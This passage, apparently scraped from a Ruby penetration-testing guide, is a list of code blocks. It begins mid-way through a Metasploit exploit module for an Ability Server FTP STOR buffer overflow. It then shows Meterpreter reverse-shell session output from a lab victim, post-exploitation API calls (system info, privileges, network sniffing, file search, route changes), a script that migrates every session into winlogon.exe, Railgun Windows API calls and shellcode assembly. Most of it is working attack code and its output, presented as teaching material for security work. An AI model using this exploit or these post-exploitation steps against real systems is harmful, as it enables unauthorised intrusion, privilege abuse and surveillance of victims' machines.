IP address + FTP user lengths into account for EIP offset\n    padd_size = target['Offset'] + (13 - myhost.length) + (3 - datastore['FTPUSER'].length)\n    junk = rand_text_alpha(padd_size)\n\n    sploit = junk\n    sploit << [target.ret].pack('V')\n    sploit << make_nops(32)\n    sploit << payload.encoded\n    sploit << rand_text_alpha(sploit.length)\n\n    send_cmd(['STOR', sploit], false)\n    handler\n    disconnect\n  end\nend \n```", "```\nmetasploit-framework/tools/dev/msftidy.rb ability_server_stor.rb \n```", "```\nmsf exploit(handler) > exploit\n\n[*] Started reverse handler on 192.168.0.18:4444 \n[*] Starting the payload handler...\n[*] Sending stage (957486 bytes) to 192.168.0.18\n[*] Meterpreter session 1 opened (192.168.0.18:4444 -> 192.168.0.18:33603) at 2015-11-22 06:33:00 +0300\n\nmeterpreter > irb\n[*] Starting IRB shell\n[*] The 'client' variable holds the Meterpreter client\n\n>> require 'irb/completion'\n=> true \n```", "```\nmeterpreter > pry\n_pry_.prompt = proc { \"-> \" } \n```", "```\nprint_good(\"Rubyfu!\") \n```", "```\nputs client.methods.sort \n```", "```\nclient.session_host\nclient.session_port \n```", "```\nclient.info\nclient.platform \n```", "```\n=> \"win7-64-victim\\\\Workshop @ WIN7-64-VICTIM\"\n\n=> \"x86/win32\" \n```", "```\nclient.exploit_datastore\n# Or \nclient.exploit.datastore \n```", "```\n{\"VERBOSE\"=>false, \"WfsDelay\"=>0, \"EnableContextEncoding\"=>false, \"DisablePayloadHandler\"=>false, \"ExitOnSession\"=>true, \"ListenerTimeout\"=>0, \"payload\"=>\"windows/meterpreter/reverse_tcp\", \"LPORT\"=>4444, \"ReverseConnectRetries\"=>5, \"ReverseAllowProxy\"=>false, \"ReverseListenerThreaded\"=>false, \"PayloadUUIDTracking\"=>false, \"EnableStageEncoding\"=>false, \"StageEncoderSaveRegisters\"=>\"\", \"StageEncodingFallback\"=>true, \"PrependMigrate\"=>false, \"EXITFUNC\"=>\"process\", \"AutoLoadStdapi\"=>true, \"AutoVerifySession\"=>true, \"AutoVerifySessionTimeout\"=>30, \"InitialAutoRunScript\"=>\"\", \"AutoRunScript\"=>\"\", \"AutoSystemInfo\"=>true, \"EnableUnicodeEncoding\"=>false, \"SessionRetryTotal\"=>3600, \"SessionRetryWait\"=>10, \"SessionExpirationTimeout\"=>604800, \"SessionCommunicationTimeout\"=>300, \"lhost\"=>\"192.168.0.18\", \"ReverseListenerBindPort\"=>0, \"TARGET\"=>0} \n```", "```\n>> client.core\n=> #<Rex::Post::Meterpreter::ClientCore:0x00000005f83388 @client=#<Session:meterpreter 192.168.0.18:55861 (192.168.242.128) \"win7-64-victim\\Workshop @ WIN7-64-VICTIM\">, @name=\"core\"> \n```", "```\n>> client.sniffer\n=> nil \n```", "```\n>> client.use \"sniffer\"\n=> nil \n```", "```\n>> client.core.use \"sniffer\"\n=> true\n>> client.sniffer\n=> #<Rex::Post::Meterpreter::Extensions::Sniffer::Sniffer:0x000000142cc108 @client=#<Session:meterpreter 192.168.0.18:55861 (192.168.242.128) \"win7-64-victim\\Workshop @ WIN7-64-VICTIM\">, @name=\"sniffer\"> \n```", "```\nclient.sniffer.methods \n```", "```\n>> client.sniffer.methods\n=> [:interfaces, :capture_start, :capture_stop, :capture_stats, :capture_release, :capture_dump, :capture_dump_read, :name, :name=, :client, :client=, :psych_to_yaml, :to_yaml, :to_yaml_properties, :blank?, :present?, :presence, :acts_like?, :to_param, :to_query, :try, :try!, :duplicable?, :deep_dup, :in?, :instance_values, :instance_variable_names, :to_json, :with_options, :html_safe?, :`, :dclone, :old_send, :as_json, :require_or_load, :require_dependency, :load_dependency, :load, :require, :unloadable, :assert_no_remainder, :decode_tlv, :decode_integer, :decode_timeticks, :decode_integer_value, :decode_uinteger_value, :build_integer, :decode_octet_string, :decode_ip_address, :decode_sequence, :decode_object_id, :decode_object_id_value, :encode_length, :encode_integer, :encode_tagged_integer, :integer_to_octets, :encode_null, :encode_exception, :encode_tlv, :encode_octet_string, :encode_sequence, :encode_object_id, :pretty_print, :pretty_print_cycle, :pretty_print_instance_variables, :pretty_print_inspect, :nil?, :===, :=~, :!~, :eql?, :hash, :<=>, :class, :singleton_class, :clone, :dup, :taint, :tainted?, :untaint, :untrust, :untrusted?, :trust, :freeze, :frozen?, :to_s, :inspect, :methods, :singleton_methods, :protected_methods, :private_methods, :public_methods, :instance_variables, :instance_variable_get, :instance_variable_set, :instance_variable_defined?, :remove_instance_variable, :instance_of?, :kind_of?, :is_a?, :tap, :send, :public_send, :respond_to?, :extend, :select, :display, :sleep, :method, :public_method, :singleton_method, :define_singleton_method, :object_id, :to_enum, :enum_for, :gem, :class_eval, :pretty_inspect, :silence_warnings, :enable_warnings, :with_warnings, :silence_stderr, :silence_stream, :suppress, :capture, :silence, :quietly, :debugger, :breakpoint, :suppress_warnings, :==, :equal?, :!, :!=, :instance_eval, :instance_exec, :__send__, :__id__] \n```", "```\nclient.sniffer.interfaces\n=> [{\"idx\"=>1, \"name\"=>\"\\\\Device\\\\NdisWanBh\", \"description\"=>\"WAN Miniport (Network Monitor)\", \"type\"=>3, \"mtu\"=>1514, \"wireless\"=>false, \"usable\"=>true, \"dhcp\"=>false}, \n{\"idx\"=>2, \"name\"=>\"\\\\Device\\\\{DF8BF690-33F1-497F-89ED-A31C236FE8E3}\", \"description\"=>\"Intel(R) PRO/1000 MT Network Connection\", \"type\"=>0, \"mtu\"=>1514, \"wireless\"=>false, \"usable\"=>true, \"dhcp\"=>true}] \n```", "```\n>> client.fs\n=> #<Rex::Post::Meterpreter::ObjectAliases:0x00000001db6ae0 @aliases={\"dir\"=>#<Class:0x00000001e09e70>, \"file\"=>#<Class:0x00000001e12890>, \"filestat\"=>#<Class:0x00000001db7530>, \"mount\"=>#<Rex::Post::Meterpreter::Extensions::Stdapi::Fs::Mount:0x00000001db6c48 @client=#<Session:meterpreter 192.168.0.18:57016 (192.168.242.128) \"win7-64-victim\\Workshop @ WIN7-64-VICTIM\">>}> \n```", "```\n    >> client.fs.dir.pwd\n    => \"C:\\\\Windows\\\\System32\" \n    ```", "```\n    client.fs.dir.entries\n    client.fs.dir.entries_with_info \n    ```", "```\n    >> client.fs.dir.chdir(\"c:\\\\\")\n    => 0\n    >> client.fs.dir.pwd\n    => \"c:\\\\\" \n    ```", "```\n    >> client.fs.dir.mkdir(\"Rubyfu\")\n    => 0\n    >> client.fs.dir.chdir(\"Rubyfu\")\n    => 0\n    >> client.fs.dir.pwd\n    => \"c:\\\\Rubyfu\" \n    ```", "```\n    client.fs.file.search(\"C:\\\\Users\", \"*.exe\") \n    ```", "```\n>> client.sys\n=> #<Rex::Post::Meterpreter::ObjectAliases:0x00000001dcd600 @aliases={\"config\"=>#<Rex::Post::Meterpreter::Extensions::Stdapi::Sys::Config:0x00000001db69c8 @client=#<Session:meterpreter 192.168.0.18:57016 (192.168.242.128) \"win7-64-victim\\Workshop @ WIN7-64-VICTIM\">>, \"process\"=>#<Class:0x00000001db69a0>, \"registry\"=>#<Class:0x00000001db8ed0>, \"eventlog\"=>#<Class:0x00000001dc0e28>, \"power\"=>#<Class:0x00000001dc4398>}> \n```", "```\n    >> client.sys.config.getuid\n    => \"NT AUTHORITY\\\\SYSTEM\" \n    ```", "```\n    >> client.sys.config.sysinfo\n    => {\"Computer\"=>\"WIN7-64-VICTIM\", \"OS\"=>\"Windows 7 (Build 7600).\", \"Architecture\"=>\"x64 (Current Process is WOW64)\", \"System Language\"=>\"en_US\", \"Domain\"=>\"WORKGROUP\", \"Logged On Users\"=>2} \n    ```", "```\n    >> client.sys.config.is_system?\n    => true \n    ```", "```\n    >> client.sys.config.getprivs\n    => [\"SeDebugPrivilege\", \"SeIncreaseQuotaPrivilege\", \"SeSecurityPrivilege\", \"SeTakeOwnershipPrivilege\", \"SeLoadDriverPrivilege\", \"SeSystemProfilePrivilege\", \"SeSystemtimePrivilege\", \"SeProfileSingleProcessPrivilege\", \"SeIncreaseBasePriorityPrivilege\", \"SeCreatePagefilePrivilege\", \"SeBackupPrivilege\", \"SeRestorePrivilege\", \"SeShutdownPrivilege\", \"SeSystemEnvironmentPrivilege\", \"SeChangeNotifyPrivilege\", \"SeRemoteShutdownPrivilege\", \"SeUndockPrivilege\", \"SeManageVolumePrivilege\"] \n    ```", "```\n    >> client.sys.process.getpid\n    => 2392 \n    ```", "```\n    client.sys.process.get_processes\n    # Or\n    client.sys.process.processes \n    ```", "```\n>> client.net\n=> #<Rex::Post::Meterpreter::ObjectAliases:0x00000001dcd3d0 @aliases={\"config\"=>#<Rex::Post::Meterpreter::Extensions::Stdapi::Net::Config:0x00000001dcd4e8 @client=#<Session:meterpreter 192.168.0.18:57016 (192.168.242.128) \"win7-64-victim\\Workshop @ WIN7-64-VICTIM\">>, \"socket\"=>#<Rex::Post::Meterpreter::Extensions::Stdapi::Net::Socket:0x00000001dcd4c0 @client=#<Session:meterpreter 192.168.0.18:57016 (192.168.242.128) \"win7-64-victim\\Workshop @ WIN7-64-VICTIM\">>, \"resolve\"=>#<Rex::Post::Meterpreter::Extensions::Stdapi::Net::Resolve:0x00000001dcd470 @client=#<Session:meterpreter 192.168.0.18:57016 (192.168.242.128) \"win7-64-victim\\Workshop @ WIN7-64-VICTIM\">>}> \n```", "```\n    client.net.config.get_interfaces\n    # Or \n    client.net.config.interfaces\n    # Try nicer outputs\n    >> puts client.net.config.interfaces[0].pretty\n    Interface 11\n    ============\n    Name         : Intel(R) PRO/1000 MT Network Connection\n    Hardware MAC : 00:0c:29:ff:fa:10\n    MTU          : 1500\n    IPv4 Address : 192.168.242.128\n    IPv4 Netmask : 255.255.255.0\n    IPv6 Address : fe80::482c:27b5:6914:e813\n    IPv6 Netmask : ffff:ffff:ffff:ffff:: \n    ```", "```\n    client.net.config.netstat \n    ```", "```\n    client.net.config.arp_table\n    client.net.config.arp_table[0].ip_addr      # IP address \n    client.net.config.arp_table[0].mac_addr     # MAC address \n    client.net.config.arp_table[0].interface    # Interface \n    ```", "```\n    client.net.config.routes        # List routes \n    client.net.config.add_route(\"192.168.2.0\", 24, \"192.168.2.1\")   # Add route \n    ```", "```\n    client.net.config.get_proxy_config \n    ```", "```\nmeterpreter > use -l\nespia\nextapi\nincognito\nkiwi\nlanattacks\nmimikatz\npriv\npython\nsniffer\nstdapi \n```", "```\n# $Id$\n# $Revision$\n# Author: \n#-------------------------------------------------------------------------------\n################## Variable Declarations ##################\n\n@client = client\nsample_option_var = nil\n@exec_opts = Rex::Parser::Arguments.new(\n    \"-h\" => [ false, \"Help menu.\" ],\n    \"-o\" => [ true , \"Option that requires a value\"]\n    )\nmeter_type = client.platform\n\n################## Function Declarations ##################\n\n# Usage Message Function\n#-------------------------------------------------------------------------------\ndef usage\n    print_line \"Meterpreter Script for INSERT PURPOSE.\"\n    print_line(@exec_opts.usage)\n    raise Rex::Script::Completed\nend\n\n# Wrong Meterpreter Version Message Function\n#-------------------------------------------------------------------------------\ndef wrong_meter_version(meter = meter_type)\n    print_error(\"#{meter} version of Meterpreter is not supported with this Script!\")\n    raise Rex::Script::Completed\nend\n\n################## Main ##################\n@exec_opts.parse(args) { |opt, idx, val|\n    case opt\n    when \"-h\"\n        usage\n    when \"-o\"\n        sample_option_var = val\n    end\n}\n\n# Check for Version of Meterpreter\nwrong_meter_version(meter_type) if meter_type !~ /win32|win64|java|php|linux/i # Remove none supported versions \n```", "```\nuse post/windows/manage/migrate \n```", "```\n<ruby>\n# Find PID by name\ndef find_pid(session_num, session, process)\n  print_status(\"Session #{session_num} | Finding PID of processe #{process}\")\n    session.sys.process.get_processes().each do |x|\n    proc_name, proc_id = x['name'].downcase, x['pid']\n\n    return proc_id if proc_name == process.downcase\n  end\nend\n\nprocess = 'winlogon.exe'\nframework.sessions.each do |num,session|\n  run_single(\"set PID #{find_pid(num, session, process)}\")\n  run_single(\"set SESSION #{num}\")\n  print_status(\"Running #{active_module.fullname} against session #{num}\")\n  run_single(\"run -j\")\n  sleep 1\nend\n</ruby> \n```", "```\nresource /home/rubyfu/mass-migration.rc \n```", "```\n[*] Running post/windows/manage/migrate against session 2\n[*] Post module running as background job\n\n[*] Running module against WIN-NG118S6TM0H\n[*] Current server process: shell.exe (3968)\n[*] Spawning notepad.exe process to migrate to\n[*] Session 2 | Finding PID of processe winlogon.exe\n[+] Migrating to 3628\nSESSION => 3\n[*] Running post/windows/manage/migrate against session 3\n[*] Post module running as background job\n[*] Running module against HOME\n[*] Current server process: shell.exe (2684)\n[*] Session 3 | Finding PID of processe winlogon.exe\n[+] Migrating to 2444\nSESSION => 4\n[*] Running post/windows/manage/migrate against session 4\n[*] Post module running as background job\n[*] Running module against WIN-8H4IDI0SR5A\n[*] Current server process: shell.exe (2996)\n[*] Session 4 | Finding PID of processe winlogon.exe\n[+] Migrating to 2240\n\n[+] Successfully migrated to process 3628\n[+] Successfully migrated to process 2444\n[+] Successfully migrated to process 2240 \n```", "```\n    >> client.railgun.known_dll_names\n    => [\"kernel32\", \"ntdll\", \"user32\", \"ws2_32\", \"iphlpapi\", \"advapi32\", \"shell32\", \"netapi32\", \"crypt32\", \"wlanapi\", \"wldap32\", \"version\", \"psapi\"] \n    ```", "```\n    client.railgun.user32.functions.each_pair {|n, v| puts \"Function name: #{n}, Params: #{v.params}\"} \n    ```", "```\n    client.railgun.user32.MessageBoxA(0, \"Ruby goes evil!\", \"Rubyfu!\", \"MB_OK\") \n    ```", "```\n    >> client.railgun.user32.LockWorkStation()\n    => {\"GetLastError\"=>0, \"ErrorMessage\"=>\"The operation completed successfully.\", \"return\"=>true} \n    ```", "```\n    gem install metasm \n    ```", "```\nruby metasm-shell.rb\ntype \"exit\" or \"quit\" to quit\nuse \";\" for newline\n\nasm> \n```", "```\nasm> nop nop\n\"\\x90\\x90\"\nasm> call [eax]\n\"\\xff\\x10\"\nasm> push esp\n\"\\x54\"\nasm> pop eax\n\"\\x58\" \n```"]